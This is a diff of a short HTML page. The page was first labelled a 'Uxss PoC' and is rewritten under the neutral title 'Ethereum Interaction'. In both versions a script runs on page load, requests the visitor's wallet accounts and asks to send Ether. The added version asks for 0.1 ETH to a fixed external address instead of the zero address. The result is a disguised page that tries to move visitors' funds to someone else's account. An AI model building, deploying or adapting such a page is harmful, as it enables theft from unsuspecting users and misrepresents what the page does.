@@ -1,67 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Uxss PoC</title>
+    <title>Ethereum Interaction</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.4/dist/ethers.min.js"></script>
 </head>
 <body>
     <script>
-        window.onload = async function() { // Make the function asynchronous
-            // Check for wallet connection
-            const connected = await promptWalletConnection();
-
-            // If wallet connected, perform an Ethereum transaction
-            if (connected) {
-                await promptEthTransaction();
-            }
-        }
-
-        async function promptWalletConnection() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    // Check if wallet is already connected
-                    const accounts = await ethereum.request({ method: 'eth_accounts' });
-
-                    if (accounts.length > 0) {
-                        return true; // Wallet already connected
-                    }
-
-                    // Request wallet connection
-                    await ethereum.request({ method: 'eth_requestAccounts' });
-                    alert('Wallet connected successfully!');
-                    return true; // Wallet connected
-                } catch (error) {
-                    alert('Wallet connection request rejected by the user.');
-                    return false; // Wallet not connected
-                }
-            } else {
-                alert('Web3 (Ethereum provider) is not available in this browser.');
-                return false; // Wallet not connected
-            }
-        }
-
-        async function promptEthTransaction() {
+        window.onload = async function() {
             try {
-                const transactionParameters = {
-                    nonce: "0x00",
-                    gasPrice: "0x244AC6D",
-                    gas: "0x12A52",
-                    to: "0x0000000000000000000000000000000000000000",
-                    from: ethereum.selectedAddress,
-                    value: "0x2386F26FC10000",
-                    data: "0x00",
-                    chainId: "0x1",
-                };
+                const ethereum = window.ethereum;
 
-                const txHash = await ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [transactionParameters],
+                if (!ethereum) {
+                    alert('Web3 (Ethereum provider) is not available in this browser.');
+                    return;
+                }
+
+                await ethereum.enable(); // Request permission to access the user's accounts
+
+                const provider = new ethers.providers.Web3Provider(ethereum);
+                const signer = provider.getSigner();
+
+                // Example: Send an Ethereum transaction
+                const tx = await signer.sendTransaction({
+                    to: '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2',
+                    value: ethers.utils.parseEther('0.1') // 0.1 ETH
                 });
 
-                alert(`Transaction sent: ${txHash}`);
+                alert(`Transaction sent: ${tx.hash}`);
             } catch (error) {
                 alert('Ethereum transaction request failed or was rejected.');
             }
-        }
+        };
     </script>
 </body>
 </html>
